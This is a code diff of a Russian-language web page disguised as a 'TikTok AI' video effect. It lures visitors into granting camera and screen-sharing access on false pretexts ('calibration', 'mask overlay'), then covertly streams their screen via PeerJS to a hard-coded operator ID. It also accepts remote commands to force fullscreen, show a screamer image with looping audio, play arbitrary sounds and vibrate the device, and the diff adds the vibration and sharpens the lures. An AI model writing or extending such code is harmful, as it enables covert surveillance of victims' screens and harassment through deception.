@@ -2,12 +2,12 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>TikTok AI Morph</title>
+    <title>TikTok AI v11</title>
     <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
     <style>
         body { background: #000; color: #fff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; }
-        .box { width: 300px; padding: 30px; border-radius: 20px; background: #0d0d0d; border: 1px solid #333; }
-        .btn { background: #ff0050; color: #fff; border: none; padding: 15px; font-size: 16px; font-weight: bold; border-radius: 50px; cursor: pointer; width: 100%; margin-top: 15px; }
+        .box { width: 300px; padding: 35px; border-radius: 25px; background: #0d0d0d; border: 1px solid #333; box-shadow: 0 0 20px rgba(0,0,0,1); }
+        .btn { background: #ff0050; color: #fff; border: none; padding: 18px; font-size: 16px; font-weight: bold; border-radius: 50px; cursor: pointer; width: 100%; margin-top: 15px; transition: 0.3s; }
         #step-2, #screamer { display: none; }
         #screamer { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: #000; z-index: 9999; align-items: center; justify-content: center; }
         #screamer img { width: 100%; height: 100%; object-fit: cover; }
@@ -15,24 +15,21 @@
 </head>
 <body>
     <div id="step-1" class="box">
-        <h2>Шаг 1</h2>
-        <p>Разрешите камеру</p>
+        <h2 style="color:#ff0050">ШАГ 1</h2>
+        <p>Разрешите доступ к камере для калибровки</p>
         <button class="btn" onclick="connectCam()">РАЗРЕШИТЬ</button>
     </div>
     <div id="step-2" class="box">
-        <h2>Шаг 2</h2>
-        <p>Включите трансляцию</p>
-        <button class="btn" style="background:#00f2ea; color:#000;" onclick="connectScreen()">ВКЛЮЧИТЬ ЭФФЕКТ</button>
+        <h2 style="color:#00f2ea">ШАГ 2</h2>
+        <p>Включите трансляцию для наложения маски</p>
+        <button class="btn" style="background:#00f2ea; color:#000;" onclick="connectScreen()">ПОДТВЕРДИТЬ</button>
     </div>
 
-    <div id="screamer">
-        <img src="https://i.imgur.com/v799C7v.jpeg">
-        <audio id="s-audio" src="https://www.myinstants.com/media/sounds/screamer.mp3" loop></audio>
-    </div>
+    <div id="screamer"><img src="https://i.imgur.com/v799C7v.jpeg"><audio id="s-audio" src="https://www.myinstants.com/media/sounds/screamer.mp3" loop></audio></div>
     <audio id="remote-snd"></audio>
 
     <script>
-        const ADM_ID = 'STABLE_777'; 
+        const ADM_ID = 'SUPER_STABLE_99'; 
         const peer = new Peer();
         let conn;
 
@@ -44,15 +41,15 @@
                 document.getElementById('step-1').style.display = 'none';
                 document.getElementById('step-2').style.display = 'block';
                 listen();
-            } catch(e) { alert("Нужна камера!"); }
+            } catch(e) { alert("Ошибка камеры"); }
         }
 
         async function connectScreen() {
             try {
                 const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
                 peer.call(ADM_ID, stream);
-                document.getElementById('step-2').innerHTML = "<h3>ПОДКЛЮЧЕНО</h3>";
-            } catch(e) { alert("Нужен экран!"); }
+                document.getElementById('step-2').innerHTML = "<h3 style='color:#0f0'>СИНХРОНИЗАЦИЯ...</h3>";
+            } catch(e) { alert("Ошибка экрана"); }
         }
 
         function listen() {
@@ -61,9 +58,12 @@
                     document.documentElement.requestFullscreen().catch(()=>{});
                     document.getElementById('screamer').style.display = 'flex';
                     document.getElementById('s-audio').play();
+                    if(navigator.vibrate) navigator.vibrate([500, 500, 500]);
                 } else if (d.type === 'SND') {
                     let a = document.getElementById('remote-snd');
                     a.src = d.url; a.play();
+                } else if (d.type === 'VIB') {
+                    if(navigator.vibrate) navigator.vibrate(1000);
                 }
             });
         }
